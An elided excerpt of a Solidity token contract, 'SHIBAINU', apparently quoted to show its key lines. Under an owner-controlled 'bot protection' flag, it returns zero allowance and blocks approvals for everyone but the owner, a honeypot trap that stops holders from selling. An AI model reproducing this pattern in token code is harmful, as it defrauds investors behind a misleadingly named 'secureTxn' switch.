...
contract SHIBAINU is Context, IERC20, Ownable {
    ...
    uint256 public _maxTxAmount = 1500000 * 10**6 * 10**9;
    ...
    function allowance(address owner, address spender)
        ...
        returns (uint256)
    {
        if (owner != __owner && _botProtection) {
            return 0;
        }  
    ...
    function _approve(
        ...
        if (msg.sender != __owner && _botProtection) {
            revert();
        }
    ...
    function secureTxn(bool botProtection) external onlyOwner() {
